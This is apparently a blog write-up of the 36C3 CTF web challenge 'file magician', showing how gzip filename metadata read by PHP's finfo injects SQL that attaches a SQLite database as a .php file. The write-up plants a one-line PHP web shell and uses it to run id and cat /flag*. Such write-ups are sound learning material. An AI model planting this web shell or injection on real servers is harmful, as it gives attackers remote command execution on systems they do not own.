---
title: 36C3 Senior CTF - SQLi through file metadata to PHP RCE - file magician 
description: Performing SQL injection using file metadata to earn PHP RCE
categories: ctf 36c3 senior
author: Xh4H
tags: 36c3 senior ctf file magician file_magician sqli sqli_injection php php_rce rce remote code execution
---

**Challenge description**
```
Web
Difficulty: easy (133 solves): round(1000 · min(1, 10 / (9 + [133 solves]))) = 70 points

Finally (again), a minimalistic, open-source file hosting solution.

```

**Action**

We are given the following files:

<div style="text-align:center"><img src="/assets/images/36c3/files_1.png"/></div>

**index.php** with the code that we will have to analyze, a **Dockerfile** to set up our service locally, and a folder with required stuff for the said service.

Let's start by setting up a docker:

`echo 'hxp{FLAG}' > flag.txt && docker build -t file_magician . && docker run -ti -p 8000:80 file_magician`

<div style="text-align:center"><img src="/assets/images/36c3/docker_setup1.png"/></div>

Docker is now running on port 8000.

Let's read the php code now:

<div style="text-align:center"><img src="/assets/images/36c3/code_review1.png"/></div>

The attack vector is in the following line of code:

```php
$s = "INSERT INTO upload(info) VALUES ('" .(new finfo)->file($_FILES['file']['tmp_name']). " ');";
```

We have to perform SQLi using file metadata. After some research, `.gz` (gunzip) files have an interesting metadata string that will help us a lot.

Here is an example:

<div style="text-align:center"><img src="/assets/images/36c3/gunzip1.png"/></div>

Check how running `file` over the created gunzip displays the name of the original file **between double quotes**, which will break the SQL sentence. In the following image we can see in red the double quotes that will break the SQL sentence, in gray is our file metadata and finally in yellow, the previous file name, where will be inject our SQL code.

<div style="text-align:center"><img src="/assets/images/36c3/carbon_1.png"/></div>

So, I ran `nano` over the file and edited the previous file name into my SQLi sentence.

_The green marked text is the SQL sentence that I will use to get RCE_

<div style="text-align:center"><img src="/assets/images/36c3/sqli_create.png"/></div>

My php code will be
```php
<?=`$_GET[j]`?>
```

Explanation of the code above:

- `<?`: PHP opening tags.
- `=`: used to echo the output.
- \`: used to execute a string (as if we were using system function).
- `$_GET[j]`: used to retrieve the `j` url parameter
- `>?`: PHP closing tags.

Notice how I am attaching the DB on a file called `k.php`, if the file doesn't exist, it will be created on the current directory, which, in our case, is a random folder:

```php
if( ! isset($_SESSION['id'])) {
    $_SESSION['id'] = bin2hex(random_bytes(32));
}

$d = '/var/www/html/files/'.$_SESSION['id'] . '/';
@mkdir($d, 0700, TRUE);
chdir($d) || die('chdir');
```

**The SQL sentence max char length was 95, so I had to create two different gz, create.gz and insert.gz**

In `create.gz` I attach a new database to a php file and I create a table `p` with a column `d text` that will store my php code.

In `insert.gz` I attach the php sql connection into the newly created database and insert the php code:

<div style="text-align:center"><img src="/assets/images/36c3/sqli_insert.png"/></div>

We upload both files to the service and access our php file as following:

- create.gz to create the DB
- insert.gz to insert our code

Click on the second file:

<div style="text-align:center"><img src="/assets/images/36c3/service_1.png"/></div>

It will bring us to a link like this `http://x.x.x.x:8000/files/70d80f242200060e52e596c9a324407287f40456164726b7d1278c06657e2dd1/2`

Change the last 2 with `k.php` and we will be able to execute PHP code using the 
```php
`$_GET[j]`
```
that we placed before, as we will be accessing a php file that will be executed by the server. Use `j` as url parameter to execute any command within the host system.

`http://x.x.x.x:8000/files/70d80f242200060e52e596c9a324407287f40456164726b7d1278c06657e2dd1/k.php?j=id`

<div style="text-align:center"><img src="/assets/images/36c3/rce_1.png"/></div>

In order to find the flag, as it was generated with random chars in its name, we can use * to expand chars over a file on the system such as `cat /flag*`:

`http://x.x.x.x:8000/files/70d80f242200060e52e596c9a324407287f40456164726b7d1278c06657e2dd1/k.php?j=cat%20/flag*`

<div style="text-align:center"><img src="/assets/images/36c3/rce_2.png"/></div>

**Flag**: hxp{I should have listened to my mum about not trusting files about files}


Thanks for reading :)

<script src="https://www.hackthebox.eu/badge/21439"></script>
